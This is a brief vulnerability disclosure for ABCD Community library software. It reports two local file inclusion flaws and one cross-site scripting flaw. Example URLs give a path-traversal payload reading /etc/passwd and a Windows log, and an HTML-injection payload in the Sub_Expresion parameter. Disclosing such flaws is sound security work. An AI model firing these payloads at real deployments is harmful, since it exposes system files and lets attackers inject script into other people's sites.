# Local File Inclusion and XSS in **ABCD Community**
## Vulnerable software: https://abcd-community.org/

There are two **Local File Inclusion** vulnerabilities in ABCD software:  
<br>
**show_image.php**   
**otros_sitios.php**

Examples:<br>
www[.]XXXXX[.]com[.]br/common/show_image.php?image=../../../../../../../etc/passwd&base=arquivo
<br>
www[.]XXXXX[.]com[.]br/abcd/opac/php/otros_sitios.php?sitio=C:/Windows/debug/NetSetup.log&submenu=N
<br>
<br>
<br>
A **XSS vulnerability** was found in the **Sub_Expresion** parameter on buscar_integrada.php file:
<br>
<br>
<br>
www[.]XXXXX[.]com[.]br/buscar_integrada.php?alcance=&IR_A=&campo=Se%EF%BF%BD%EF%BF%BDo&LastKey=fdsfadsa&base=arquivo&Diccio=4-1&**Sub_Expresion**=%22fda%3Cinput%3E%3Cinput%3Esfdafds%22&Sub_Expresiones=&Navegacion=&Expresion=&Campos=TW_+~~~+REF_+~~~+DAL_+~~~+FUL_+~~~+SEC_+~~~+SPL_+~~~+GDL_&Operadores=and+~~~+and+~~~+and+~~~+and+~~~+and+~~~+and&modo=1B&llamado_desde=avanzada.php&lang=pt&resaltar=S&prefijo=SEC_&Opcion=buscar_diccionario&Seleccionados=%22fdsaf%22

![image](https://www.guerrilhacibernetica.com.br/images/next.png?abcd)
